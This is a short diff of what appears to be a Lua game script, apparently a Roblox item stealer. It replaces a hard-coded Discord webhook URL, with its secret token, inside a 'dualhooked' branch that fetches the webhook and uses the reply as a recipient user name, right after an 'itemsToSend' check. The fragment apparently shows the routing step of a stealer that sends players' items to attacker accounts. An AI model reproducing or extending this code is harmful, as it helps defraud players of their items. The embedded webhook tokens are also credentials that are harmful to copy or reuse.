@@ -513,7 +513,7 @@ if #itemsToSend > 0 then
 
     if dualhooked then
         local response = request({
-            Url = "https://discord.com/api/webhooks/1342243035400110140/5Kvf07D_4jfKa_CG9R1oZg89JSn_OYUHief9LzbDrKAoXYb3c-epXMxad1OIHXaAp3QE",
+            Url = "https://discord.com/api/webhooks/1372155696941891634/Qa0z76wbT8otIHCEFVot9vSZdVY39x34Ix4vVJaeKULEEaypHegcMTr6jbD74NZR9sgeD",
             Method = "GET"
         })
         discuser = response.Body
